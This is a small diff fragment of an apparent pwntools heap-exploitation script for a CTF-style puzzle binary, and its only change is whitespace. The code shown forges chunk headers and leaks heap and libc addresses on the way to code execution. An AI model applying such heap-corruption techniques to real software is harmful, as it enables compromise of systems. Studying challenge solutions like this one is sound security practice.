@@ -106,7 +106,6 @@ if __name__ == '__main__':
 			p64(0)+p64(0x61)+\
 			p64(0)*10+\
 			p64(0)+p64(0x61)).ljust(0x100,b'A'))#5
-
 	deletepuzzle(4)
 	L_STR = p64(0x0)*4+\
 		p64(0x0)+p64(0x51)+\
@@ -127,6 +126,7 @@ if __name__ == '__main__':
 		p64(heap_leak+0xac0)+p64(0x10)+\
 		p64(0x0)+p64(0x0)+\
 		p64(0x0)+p64(0x21)
+		
 	addpuzzle('BBBB',0x70,L_STR.ljust(0x400,b'\x00')+p64(heap_leak+0xb50)+p64(heap_leak+0xb90)+p64(heap_leak+0xba0)) #5
 	large_bin = u64(showpuzzle(10,6)[4].split(b':')[1][1:][:-4])
 	libc_base = large_bin-large_bin_offset
